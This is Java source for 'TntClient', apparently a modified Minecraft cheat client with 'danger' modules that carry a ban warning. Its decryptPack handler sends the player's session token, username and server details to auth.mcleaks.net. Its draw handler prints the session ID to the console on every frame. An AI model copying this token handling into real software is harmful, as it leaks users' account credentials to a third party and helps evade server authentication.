package net.TntClient;

import io.netty.util.concurrent.Future;
import io.netty.util.concurrent.GenericFutureListener;
import net.TntClient.event.EventManager;
import net.TntClient.event.EventTarget;
import net.TntClient.event.events.Event2D;
import net.TntClient.event.events.EventKey;
import net.TntClient.event.events.EventReceivePacket;
import net.TntClient.event.events.EventSendPacket;
import net.TntClient.gui.JekasMenu.ListMods;
import net.TntClient.mods.SpellCecker.SpellChecker;
import net.TntClient.mods.hypixel.AutoTip;
import net.TntClient.mods.hypixel.HypixelPlayers;
import net.TntClient.mods.translate.TranslateGoogle;
import net.TntClient.modules.Module;
import net.TntClient.util.WebUtil;
import net.minecraft.client.Minecraft;
import net.minecraft.client.network.NetHandlerLoginClient;
import net.minecraft.network.login.client.C01PacketEncryptionResponse;
import net.minecraft.network.login.server.S01PacketEncryptionRequest;
import net.minecraft.util.CryptManager;
import org.lwjgl.input.Keyboard;

import javax.crypto.SecretKey;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.math.BigInteger;
import java.security.PublicKey;

public class TntClient {

    public static final String version = "1.0.6";
    public static final boolean pussy = false;

    public static boolean isDebug = false;

    public static final EventManager eventManager = new EventManager();
    private final Minecraft mc = Minecraft.getMinecraft();

    public TntClient() {
        AutoTip.startTime();
        HypixelPlayers.startTime();
        SpellChecker.startTimer();
        TranslateGoogle.startTime();
        Config.read();
        for (Module module : Config.config.getModList()) {
            if (module.isActive())
                module.onEnable();
        }
        if (pussy) {
            for (Module module : Config.config.getDangerMods()) {
                module.setActive(false);
                module.onDisable();
            }
        }
        eventManager.register(this);
    }

    @EventTarget
    public void decryptPack(EventReceivePacket event) {
        if(!(event.getPacket() instanceof S01PacketEncryptionRequest)) return;
        event.setCancelled(true);
        SecretKey secretkey = CryptManager.createNewSharedKey();
        String s = ((S01PacketEncryptionRequest)event.getPacket()).getServerId();
        PublicKey publickey = ((S01PacketEncryptionRequest)event.getPacket()).getPublicKey();
        String s1 = (new BigInteger(CryptManager.getServerIdHash(s, publickey, secretkey))).toString(16);
        //MCLeaks.joinServer(mc.getSession().getToken(), s1, Minecraft.getMinecraft().getCurrentServerData().serverIP);
        System.out.println(secretkey);
        try {
            System.out.println(WebUtil.postJson("https://auth.mcleaks.net/v1/joinserver", "{\"session\":\"" + mc.getSession().getToken() + "\",\"mcname\":\"" + mc.getSession().getUsername()
                    + "\",\"serverhash\":\"" + s1 + "\",\"server\":\"" + Minecraft.getMinecraft().getCurrentServerData().serverIP + "\"}"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        mc.myNetworkManager.sendPacket(new C01PacketEncryptionResponse(secretkey, publickey, ((S01PacketEncryptionRequest)event.getPacket()).getVerifyToken()),
                new GenericFutureListener() {
            public void operationComplete(Future p_operationComplete_1_) {
                mc.myNetworkManager.enableEncryption(secretkey);
            }});
    }

    @EventTarget
    public void onDraw(Event2D event) {
        for (Module m : Config.config.getModList())
            if (m.isDanger && m.isActive()) {
                mc.fontRendererObj.drawString("This can lead to a ban!!!", 2, (int) (event.getHeight() - 10), Util.getRainbow());
                return;
            }
        System.out.println(mc.getSession().getSessionID() + " " + mc.getSession().getUsername());
    }

    @EventTarget
    public void onUpdateKey(EventKey event) {
        if (event.getKey() == Keyboard.KEY_RSHIFT)
            mc.displayGuiScreen(new ListMods());
        else if (mc.currentScreen == null)
            for (Module m : Config.config.getModList())
                if (m.keyBind == event.getKey())
                    m.toggle();
    }
}